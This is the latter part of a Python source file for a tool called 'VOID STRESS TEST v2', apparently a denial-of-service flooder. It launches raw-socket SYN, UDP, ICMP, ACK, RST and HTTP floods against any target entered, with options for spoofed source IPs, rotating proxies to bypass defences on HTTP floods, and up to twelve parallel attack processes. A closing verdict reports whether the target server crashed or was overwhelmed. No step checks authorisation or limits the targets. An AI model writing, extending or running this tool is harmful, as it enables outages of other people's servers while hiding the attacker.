        console.print(f"  [dim]Use an IP address directly if DNS is failing.[/]\n")
        sys.exit(1)

def _bar(ratio: float, width: int = 28, col: str = "bright_red") -> Text:
    ratio  = max(0.0, min(ratio, 1.0))
    filled = int(ratio * width)
    b = Text()
    b.append("█" * filled,           style=col)
    b.append("░" * (width - filled), style="dim")
    return b

# ══════════════════════════════════════════════════════════════════
# RUN
# ══════════════════════════════════════════════════════════════════

def run(target: str, port_list: list, mode: dict, n_threads: int, stats_file: str = ""):
    # Lower process priority so other apps stay responsive
    try: os.nice(19)
    except Exception: pass
    # Ask Linux scheduler to treat these as batch (background) threads
    try:
        import ctypes
        SCHED_BATCH = 3
        ctypes.CDLL("libc.so.6", use_errno=True).sched_setscheduler(0, SCHED_BATCH, ctypes.byref(ctypes.c_int(0)))
    except Exception: pass

    stop_event.clear()

    stats    = Stats()
    mode_key = mode["key"]
    col      = mode["color"]
    label    = mode["label"]

    senders = []
    for _ in range(n_threads):
        t = threading.Thread(target=_sender,
                             args=(target, port_list, mode_key, stats), daemon=True)
        t.start()
        senders.append(t)

    threading.Thread(target=_listener,
                     args=(target, port_list[0], mode_key, stats), daemon=True).start()

    def _watch():
        while not stop_event.is_set():
            try:
                if input().strip().lower() == "stop":
                    stop_event.set()
            except Exception:
                break
    threading.Thread(target=_watch, daemon=True).start()

    # ── SILENT MODE: write stats to file (used by multi-instance parent) ──────
    if stats_file:
        import json as _json
        def _stats_writer():
            while not stop_event.is_set():
                snap = stats.snapshot()
                snap["pps"] = stats.pps()
                try:
                    with open(stats_file, "w") as _sf:
                        _json.dump(snap, _sf)
                except Exception:
                    pass
                time.sleep(0.4)
        threading.Thread(target=_stats_writer, daemon=True).start()
        try:
            stop_event.wait()
        except KeyboardInterrupt:
            stop_event.set()
        for t in senders:
            t.join(timeout=0.5)
        try:
            with open(stats_file, "w") as _sf:
                snap = stats.snapshot(); snap["pps"] = 0; snap["done"] = True
                _json.dump(snap, _sf)
        except Exception:
            pass
        return
    # ── NORMAL MODE: full live display ────────────────────────────────────────

    _snap_log    : list = []
    _last_snap_t : list = [time.time()]

    proxy_info = (f"[dim]proxy:[/] [bold bright_yellow]{PROXY_MGR.count} nodes rotating[/]"
                  if PROXY_MGR.count else
                  "[dim]proxy:[/] [dim]none[/]")

    try:
        from rich.console import Group
        with Live(console=console, refresh_per_second=1, screen=False) as live:
            while not stop_event.is_set():
                snap   = stats.snapshot()
                pps    = stats.pps()
                sent   = snap["sent"]
                reps   = snap["replies"]
                errs   = snap["errors"]
                elap   = snap["elapsed"]
                last_f = snap["last_flag"]
                loss   = ((sent - reps) / sent * 100) if sent else 100.0

                rate_bar = Text()
                rate_bar.append("  RATE   ", style="bold white")
                rate_bar.append_text(_bar(min(pps/100_000, 1.0), col=col))
                rate_bar.append(f"  {pps:,.0f} pps", style=f"bold {col}")

                rep_bar = Text()
                rep_bar.append("  REPLY  ", style="bold white")
                rep_bar.append_text(_bar(min(reps/max(sent,1), 1.0), col="bright_green"))
                rep_bar.append(f"  {reps:,}", style="bold bright_green")

                last_row = Text()
                last_row.append("  LAST   ", style="bold white")
                if last_f:
                    last_row.append(f"{last_f}  ", style="bold yellow")
                    last_row.append(f"→ {_flag_meaning(last_f)}", style="dim")
                else:
                    last_row.append("waiting for reply...", style="dim")

                src_info = (f"[dim]src:[/] [bright_red]SPOOFED[/] [dim](bare-metal mode)[/]"
                            if USE_SPOOF else
                            f"[dim]src:[/] [bright_white]{LOCAL_IP}[/] [dim](real IP)[/]")

                port_str = ",".join(str(p) for p in port_list)
                by_mode  = snap.get("by_mode", {})

                tbl = Table.grid(padding=(0,2))
                tbl.add_column(); tbl.add_column()
                tbl.add_column(); tbl.add_column()
                tbl.add_row(Text("TARGET",  style="dim"),  Text(f"{target}:{port_str}", style="bold yellow"),
                            Text("MODE",    style="dim"),  Text(label, style=f"bold {col}"))
                tbl.add_row(Text("SENT",    style="dim"),  Text(f"{sent:,}",  style="bold white"),
                            Text("RATE",    style="dim"),  Text(f"{pps:,.0f} pps", style="bold bright_red"))
                tbl.add_row(Text("REPLIES", style="dim"),  Text(f"{reps:,}",  style="bold bright_green"),
                            Text("ERRORS",  style="dim"),  Text(f"{errs:,}",  style="dim red"))
                tbl.add_row(Text("THREADS", style="dim"),  Text(f"{n_threads}", style="bold white"),
                            Text("UP",      style="dim"),  Text(f"{elap:.0f}s", style="bold white"))

                # ── per-mode breakdown bar ────────────────────────────────
                mode_rows = []
                mode_colors = {"SYN":"bright_red","UDP":"bright_cyan","ICMP":"yellow",
                               "ACK":"bright_magenta","HTTP":"bright_green","RST":"bright_yellow",
                               "SYNACK":"magenta"}
                total_by_mode = sum(by_mode.values()) or 1
                for mk, cnt in sorted(by_mode.items(), key=lambda x: -x[1]):
                    ratio = cnt / total_by_mode
                    mcol  = mode_colors.get(mk, "white")
                    row   = Text()
                    row.append(f"  {mk:<8}", style=f"bold {mcol}")
                    row.append_text(_bar(ratio, width=22, col=mcol))
                    row.append(f"  {cnt:,}", style=f"bold {mcol}")
                    mode_rows.append(row)

                live.update(Panel(
                    Group(tbl, Text(""), rate_bar, rep_bar, last_row,
                          *(mode_rows),
                          Text(""),
                          Text.from_markup(f"  {src_info}  ·  {proxy_info}"),
                          Text("  type  stop + Enter  or  Ctrl+C  to halt", style="dim red")),
                    title="[bold bright_red]  VOID STRESS TEST v2  —  ∞ INFINITE  [/]",
                    border_style="bright_red", box=box.DOUBLE_EDGE))

                if time.time() - _last_snap_t[0] >= 5.0:
                    _snap_log.append((elap, sent, reps, errs))
                    _last_snap_t[0] = time.time()

                time.sleep(1.0)   # 1 fps — cuts display CPU load 50% vs 2fps

    except KeyboardInterrupt:
        stop_event.set()

    for t in senders:
        t.join(timeout=1.0)

    snap  = stats.snapshot()
    pps_v = stats.pps()
    sent  = snap["sent"]
    reps  = snap["replies"]
    errs  = snap["errors"]       # FIX: was missing → NameError in _verdict call
    elap  = snap["elapsed"]
    loss  = ((sent - reps) / sent * 100) if sent else 100.0
    pps_a = sent / elap if elap else 0

    # ── verdict analysis ──────────────────────────────────────────
    def _verdict(snap_log, s_sent, s_reps, s_errs, s_elap):
        if s_elap < 2 or s_sent == 0:
            return "dim white", "UNKNOWN", "Run was too short to determine server state", []

        reply_ratio = s_reps / s_sent if s_sent else 0
        err_ratio   = s_errs / s_sent if s_sent else 0
        early_rps = late_rps = drop_pct = None
        extras: list = []

        if len(snap_log) >= 4:
            mid = max(1, len(snap_log) // 3)
            def _rps(a, b):
                dt = b[0] - a[0]; dr = b[2] - a[2]
                return dr / dt if dt > 0 else 0
            early_rps = _rps(snap_log[0],   snap_log[mid])
            late_rps  = _rps(snap_log[-mid], snap_log[-1])
            if early_rps > 0:
                drop_pct = (early_rps - late_rps) / early_rps * 100

        if early_rps is not None and early_rps > 0 and late_rps == 0:
            extras.append(f"  Replies stopped after ~{snap_log[mid][0]:.0f}s into the run")
            return ("bright_red", "CRASHED",
                    "Server was responding then went completely silent — likely crashed or OOM-killed",
                    extras)

        if s_reps == 0:
            if err_ratio > 0.4:
                extras.append(f"  {s_errs:,} connection errors — port may be closed or refused")
                return ("bright_red", "CRASHED / REFUSED",
                        "Server refused every connection — process may be down", extras)
            return ("dim white", "NO REPLY",
                    "Zero responses — firewall, filtered port, or host offline", extras)

        if drop_pct is not None:
            extras.append(f"  Early reply rate : {early_rps:.1f} rps")
            extras.append(f"  Late  reply rate : {late_rps:.1f} rps")
            if drop_pct > 60:
                return ("yellow", "LAGGED",
                        f"Reply rate fell {drop_pct:.0f}% — server struggling and slowing down", extras)
            elif drop_pct > 25:
                return ("yellow", "DEGRADED",
                        f"Reply rate fell {drop_pct:.0f}% — noticeable slowdown under sustained load", extras)
            else:
                return ("bright_green", "HELD UP",
                        "Server maintained consistent replies throughout — load was absorbed", extras)

        if reply_ratio > 0.3:
            return ("bright_green", "HELD UP",     "Server replied to most packets — held up well",   extras)
        elif reply_ratio > 0.05:
            return ("yellow",       "LAGGED",      "Low reply ratio — server was likely under strain", extras)
        else:
            return ("bright_red",   "OVERWHELMED", "Barely any replies — server heavily suppressed",   extras)

    v_col, v_label, v_detail, v_extras = _verdict(_snap_log, sent, reps, errs, elap)

    # ── summary ───────────────────────────────────────────────────
    console.print()
    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
    console.print()
    console.print(f"  [dim]Target          [/]  [bold yellow]{target}:{','.join(str(p) for p in port_list)}[/]")
    console.print(f"  [dim]Mode            [/]  [bold {col}]{label}[/]")
    console.print(f"  [dim]Source          [/]  [bold white]{'SPOOFED' if USE_SPOOF else LOCAL_IP+' (real IP)'}[/]")
    console.print(f"  [dim]Engine          [/]  [bold white]Python raw sockets · {n_threads} threads · blocking[/]")
    console.print(f"  [dim]Packets sent    [/]  [bold white]{sent:,}[/]")
    console.print(f"  [dim]Replies         [/]  [bold white]{reps:,}[/]")
    console.print(f"  [dim]Errors          [/]  [bold white]{errs:,}[/]")
    console.print(f"  [dim]Packet loss     [/]  [{'bright_green' if loss<20 else 'bright_red'}]{loss:.1f}%[/]")
    console.print(f"  [dim]Avg rate        [/]  [bold white]{pps_a:,.0f} pps[/]")
    console.print(f"  [dim]Duration        [/]  [bold white]{elap:.1f}s[/]")

    if PROXY_MGR.count:
        console.print()
        console.print(Rule("[dim red]  PROXY STATS  [/]", style="dim red"))
        for url, ok, fail in PROXY_MGR.summary():
            short = url[:60]
            color = "bright_green" if fail == 0 else ("yellow" if ok > fail else "bright_red")
            console.print(f"  [{color}]●[/]  [dim]{short}[/]  "
                          f"[bright_green]{ok} ok[/]  [dim red]{fail} fail[/]")

    console.print()
    verdict_text = Text()
    verdict_text.append(f"\n  {v_label}\n", style=f"bold {v_col}")
    verdict_text.append(f"\n  {v_detail}\n", style=v_col)
    for line in v_extras:
        verdict_text.append(f"\n{line}", style="dim")
    verdict_text.append("\n")
    console.print(Panel(verdict_text,
                        title=f"[bold {v_col}]  SERVER STATUS  [/]",
                        border_style=v_col, box=box.DOUBLE_EDGE))
    console.print()
    console.print(Rule(style="bright_red"))

# ══════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════

def main():
    global LOCAL_IP, USE_SPOOF, PROXY_MGR, N_THREADS

    import argparse
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("--target",  default="")
    parser.add_argument("--port",    default="")
    parser.add_argument("--mode",    default="")
    parser.add_argument("--spoof",   action="store_true",
                        help="Randomise source IPs (bare-metal only — breaks on WSL NAT)")
    parser.add_argument("--threads", default="", type=str,
                        help="Override thread count (default 32)")
    parser.add_argument("--proxies", default="",
                        help="Comma-separated proxy list for HTTP bypass. "
                             "Format: socks5://ip:port,socks5://ip2:port2  "
                             "or http://ip:port. "
                             "Only active for HTTP flood (mode 5). "
                             "Example: --proxies socks5://1.2.3.4:1080,socks5://5.6.7.8:1080")
    parser.add_argument("--instances", type=int, default=1,
                        help="Spawn N simultaneous attack instances (1-12). --triple is an alias for --instances 3")
    parser.add_argument("--triple", action="store_true",
                        help=argparse.SUPPRESS)   # backward-compat alias → --instances 3
    parser.add_argument("--ports",   default="",
                        help="Comma-separated ports to cycle across per packet (e.g. 80,443,8080). "
                             "Leave blank to use the single port from --port or the prompt.")
    parser.add_argument("--stats-file", default="", dest="stats_file",
                        help=argparse.SUPPRESS)   # internal: silent mode, write JSON stats to path
    parser.add_argument("--child",  action="store_true",
                        help=argparse.SUPPRESS)   # internal: skips prompts in sub-instances
    args, _ = parser.parse_known_args()

    USE_SPOOF  = args.spoof
    n_threads  = int(args.threads) if args.threads.isdigit() else N_THREADS
    n_instances = max(1, min(12, args.instances if not args.triple else 3)) if args.instances != 1 or args.triple else 12

    # Parse proxies
    proxy_list: list = []
    if args.proxies:
        proxy_list = [p.strip() for p in args.proxies.split(",") if p.strip()]
    PROXY_MGR = ProxyManager(proxy_list)

    if os.geteuid() != 0 and args.mode not in ("5",):
        banner()
        console.print("\n  [bold red][!][/]  Raw sockets need root.\n"
                      "  [dim]Run:  sudo python3 void_stress_v2.py[/]\n")
        return

    # ── child mode: no banner/prompts, just fire ──────────────────
    if args.child:
        target    = resolve(args.target)
        LOCAL_IP  = get_local_ip(target)
        port_list = ([int(p) for p in args.ports.split(",") if p.strip().isdigit()]
                     if args.ports else
                     [int(args.port) if args.port.isdigit() else 80])
        mode      = MODES.get(args.mode, MODES["1"])
        n_threads = int(args.threads) if args.threads and args.threads.isdigit() else N_THREADS
        # Child processes are SCHED_BATCH already; also pin away from core 0 (UI/IRQ core)
        try:
            cpu_count = os.cpu_count() or 2
            if cpu_count > 1:
                os.sched_setaffinity(0, set(range(1, cpu_count)))
        except Exception:
            pass
        try:
            run(target, port_list, mode, n_threads, stats_file=args.stats_file)
        except KeyboardInterrupt:
            stop_event.set()
        return

    banner()
    console.print()

    # ── proxy health check ────────────────────────────────────────
    if PROXY_MGR.count:
        console.print(Rule("[dim red]  PROXY BYPASS NODES  [/]", style="dim red"))
        console.print()
        console.print(f"  [bright_yellow][BYPASS][/]  Checking {PROXY_MGR.count} proxy node(s)…")
        results = PROXY_MGR.health_check()
        alive   = sum(1 for _, ok in results if ok)
        for url, ok in results:
            status = "[bright_green]ALIVE[/]" if ok else "[bright_red]DEAD [/]"
            console.print(f"  [{('bright_green' if ok else 'bright_red')}]●[/]  "
                          f"[dim]{url[:70]}[/]  {status}")
        console.print()
        if alive == 0:
            console.print("  [bold red][!][/]  All proxies failed health check — "
                          "HTTP flood will run without bypass.\n")
        else:
            console.print(f"  [bright_green][✓][/]  {alive}/{PROXY_MGR.count} proxy node(s) alive — "
                          f"bypass ACTIVE for HTTP flood.\n")
        console.print()

    # ── target ────────────────────────────────────────────────────
    if args.target:
        target = resolve(args.target)
        console.print(f"  [dim]Target:[/] [bold yellow]{target}[/]")
    else:
        console.print("  [bright_red]◈[/]  ", end="")
        raw_t = input("Target IP, hostname, or URL: ").strip()
        if not raw_t:
            console.print("  [red]No target. Abort.[/]"); return
        raw_t  = re.sub(r'^https?://', '', raw_t).split('/')[0].split(':')[0]
        target = resolve(raw_t)

    LOCAL_IP = get_local_ip(target)   # FIX: always set before any _src_ip() call
    if USE_SPOOF:
        src_mode = "[bright_red]SPOOFED[/] [dim](--spoof set — may drop on WSL NAT)[/]"
    elif LOCAL_IP.startswith("127."):
        src_mode = f"[bright_yellow]{LOCAL_IP}[/] [dim](fallback — could not detect real IP)[/]"
    else:
        src_mode = f"[bright_white]{LOCAL_IP}[/] [dim](real IP)[/]"
    console.print(f"  [dim]Source IP:[/]  {src_mode}")

    # ── port / port_list ─────────────────────────────────────────
    if args.ports:
        port_list = [int(p) for p in args.ports.split(",") if p.strip().isdigit()]
        if not port_list:
            port_list = [80]
        console.print(f"  [dim]Ports:[/] [bold yellow]{','.join(str(p) for p in port_list)}[/]")
    elif args.port.isdigit():
        port_list = [int(args.port)]
        console.print(f"  [dim]Port:[/] [bold yellow]{port_list[0]}[/]")
    else:
        console.print("  [bright_red]◈[/]  ", end="")
        port_raw = input("Port(s) — single or comma-separated (80,443,8080): ").strip()
        port_list = [int(p) for p in port_raw.split(",") if p.strip().isdigit()] or [80]

    # ── mode ──────────────────────────────────────────────────────
    if args.mode in MODES:
        mode = MODES[args.mode]
        console.print(f"  [dim]Mode:[/]  [bold {mode['color']}]{mode['label']}[/]")
    else:
        show_mode_menu()
        console.print("  [bright_red]◈[/]  ", end="")
        choice = input("Choice (1-7, default 1): ").strip()
        mode   = MODES.get(choice, MODES["1"])

    # ── confirm ───────────────────────────────────────────────────
    console.print()
    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
    port_str_confirm = ",".join(str(p) for p in port_list)
    console.print(f"  [dim]Target    [/]  [bold yellow]{target}:{port_str_confirm}[/]")
    console.print(f"  [dim]Mode      [/]  [bold {mode['color']}]{mode['label']}[/]  [dim]— {mode['desc']}[/]")
    console.print(f"  [dim]Source IP [/]  {src_mode}")
    instances_str = f"{n_instances} instance{'s' if n_instances > 1 else ''} × {n_threads} threads = {n_instances*n_threads} total"
    console.print(f"  [dim]Engine    [/]  [bold white]{instances_str} · blocking raw sockets · ∞ infinite[/]")
    if PROXY_MGR.count:
        console.print(f"  [dim]Bypass    [/]  [bold bright_yellow]{PROXY_MGR.count} proxy node(s) for HTTP flood[/]")
    console.print()
    console.print("  [bright_red]◈[/]  ", end="")
    if input("Start? (Y/N): ").strip().lower() not in ("y", "yes"):
        console.print("\n  [yellow]Aborted.[/]\n"); return

    show_geo_attack_map(target, mode["label"], mode["color"], PROXY_MGR.count)

    for i in range(3, 0, -1):
        console.print(f"\r  [bold bright_red][!][/]  Firing in [bright_red]{i}[/]...", end="")
        time.sleep(1)

    if n_instances > 1:
        # ── MULTI-INSTANCE FIRE (3–12 simultaneous child processes) ──
        # Auto-scale threads per child so total thread count stays sane
        # and the host OS doesn't freeze: 384 threads (12×32) → all land
        # on non-UI cores via sched_setaffinity in child mode.
        threads_per_child = max(8, n_threads // n_instances)
        total_threads     = threads_per_child * n_instances
        console.print(f"\r  [bold bright_red][!!!][/]  VOID × {n_instances} — {threads_per_child} threads/instance — {total_threads} TOTAL             ")
        console.print()

        mode_key_str = str([k for k,v in MODES.items() if v is mode][0])
        port_str_arg = ",".join(str(p) for p in port_list)
        script       = os.path.abspath(__file__)
        child_cmd    = [
            sys.executable, script,
            "--target",  target,
            "--port",    str(port_list[0]),
            "--ports",   port_str_arg,
            "--mode",    mode_key_str,
            "--threads", str(threads_per_child),
            "--child",
        ]
        if USE_SPOOF:
            child_cmd.append("--spoof")
        if PROXY_MGR.count:
            child_cmd += ["--proxies", args.proxies]

        stats_files = [f"/tmp/void_stats_{i}.json" for i in range(n_instances)]
        # Pre-create empty stat files so the dashboard doesn't error before children write
        import json as _json
        for sf in stats_files:
            try:
                with open(sf, "w") as _f: _json.dump({"sent":0,"replies":0,"errors":0,"pps":0,"elapsed":0,"by_mode":{}}, _f)
            except Exception: pass

        procs = []
        for i in range(n_instances):
            child_with_stats = child_cmd + ["--stats-file", stats_files[i]]
            procs.append(subprocess.Popen(child_with_stats,
                                          stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL))

        pids_str = "  ".join(f"[yellow]{p.pid}[/]" for p in procs)
        console.print(f"  [bold bright_red][!!!][/]  {n_instances} instances live — PIDs: {pids_str}")
        console.print(f"  [dim]Press Ctrl+C to stop all {n_instances}[/]")
        console.print()

        t_start = time.time()
        mode_colors = {"SYN":"bright_red","UDP":"bright_cyan","ICMP":"yellow",
                       "ACK":"bright_magenta","HTTP":"bright_green","RST":"bright_yellow","SYNACK":"magenta"}
        mcol = mode_colors.get(mode["key"], "bright_red")

        def _read_stats(path):
            try:
                with open(path) as _f: return _json.load(_f)
            except Exception: return {"sent":0,"replies":0,"errors":0,"pps":0,"elapsed":0,"by_mode":{}}

        try:
            from rich.console import Group
            with Live(console=console, refresh_per_second=1, screen=False) as live:
                while True:
                    alive = sum(1 for p in procs if p.poll() is None)
                    if alive == 0:
                        stop_event.set(); break

                    all_stats = [_read_stats(sf) for sf in stats_files]
                    total_sent    = sum(d.get("sent",    0) for d in all_stats)
                    total_replies = sum(d.get("replies", 0) for d in all_stats)
                    total_errors  = sum(d.get("errors",  0) for d in all_stats)
                    total_pps     = sum(d.get("pps",     0) for d in all_stats)
                    elapsed       = time.time() - t_start

                    # Combined by-mode totals
                    combined_mode: dict = {}
                    for d in all_stats:
                        for mk, cnt in d.get("by_mode", {}).items():
                            combined_mode[mk] = combined_mode.get(mk, 0) + cnt

                    port_str_disp = ",".join(str(p) for p in port_list)
                    src_info = ("[dim]src:[/] [bright_red]SPOOFED[/]" if USE_SPOOF
                                else f"[dim]src:[/] [bright_white]{LOCAL_IP}[/]")

                    tbl = Table.grid(padding=(0,2))
                    tbl.add_column(); tbl.add_column()
                    tbl.add_column(); tbl.add_column()
                    tbl.add_row(Text("TARGET",  style="dim"), Text(f"{target}:{port_str_disp}", style="bold yellow"),
                                Text("MODE",    style="dim"), Text(mode["label"], style=f"bold {mcol}"))
                    tbl.add_row(Text("TOTAL",   style="dim"), Text(f"{total_sent:,}",    style="bold white"),
                                Text("RATE",    style="dim"), Text(f"{total_pps:,.0f} pps", style="bold bright_red"))
                    tbl.add_row(Text("REPLIES", style="dim"), Text(f"{total_replies:,}", style="bold bright_green"),
                                Text("ERRORS",  style="dim"), Text(f"{total_errors:,}",  style="dim red"))
                    tbl.add_row(Text("THREADS", style="dim"), Text(f"{threads_per_child*n_instances} ({threads_per_child}×{n_instances})", style="bold white"),
                                Text("UP",      style="dim"), Text(f"{elapsed:.0f}s",   style="bold white"))

                    rate_bar = Text()
                    rate_bar.append("  RATE   ", style="bold white")
                    rate_bar.append_text(_bar(min(total_pps/500_000, 1.0), width=26, col=mcol))
                    rate_bar.append(f"  {total_pps:,.0f} pps", style=f"bold {mcol}")

                    rep_bar = Text()
                    rep_bar.append("  REPLY  ", style="bold white")
                    rep_bar.append_text(_bar(min(total_replies/max(total_sent,1), 1.0), width=26, col="bright_green"))
                    rep_bar.append(f"  {total_replies:,}", style="bold bright_green")

                    # Per-instance row (compact — one line each)
                    inst_rows = []
                    max_pps_inst = max((d.get("pps",0) for d in all_stats), default=1) or 1
                    for i, d in enumerate(all_stats):
                        is_alive = procs[i].poll() is None
                        ipps  = d.get("pps", 0)
                        isent = d.get("sent", 0)
                        row = Text()
                        row.append(f"  #{i+1:02d}  ", style="dim")
                        row.append_text(_bar(ipps/max_pps_inst, width=18, col=mcol))
                        row.append(f"  {ipps:>9,.0f} pps", style=f"bold {mcol}")
                        row.append(f"  {isent:>12,}", style="dim")
                        row.append("  ●" if is_alive else "  ✗",
                                   style="bright_green" if is_alive else "red")
                        inst_rows.append(row)

                    live.update(Panel(
                        Group(tbl, Text(""), rate_bar, rep_bar, Text(""),
                              Text("  INSTANCES", style="dim"),
                              *inst_rows,
                              Text(""),
                              Text.from_markup(f"  {src_info}  ·  [dim]{alive}/{n_instances} alive[/]"),
                              Text("  Ctrl+C to stop all", style="dim red")),
                        title=f"[bold bright_red]  VOID × {n_instances}  —  COMBINED DASHBOARD  [/]",
                        border_style="bright_red", box=box.DOUBLE_EDGE))

                    time.sleep(1.0)

        except KeyboardInterrupt:
            pass
        finally:
            for p in procs:
                try: p.terminate()
                except Exception: pass
            # Cleanup stat files
            for sf in stats_files:
                try: os.remove(sf)
                except Exception: pass
            console.print(f"\n\n  [yellow]All {n_instances} instances stopped.[/]\n")
    else:
        console.print(f"\r  [bold bright_red][!!!][/]  FIRING — {n_threads} THREADS — BLOCKING RAW SOCKETS             ")
        console.print()
        try:
            run(target, port_list, mode, n_threads)
        except KeyboardInterrupt:
            stop_event.set()
            console.print("\n  [yellow]Stopped.[/]\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"\n  [bold red][!][/]  {e}\n")
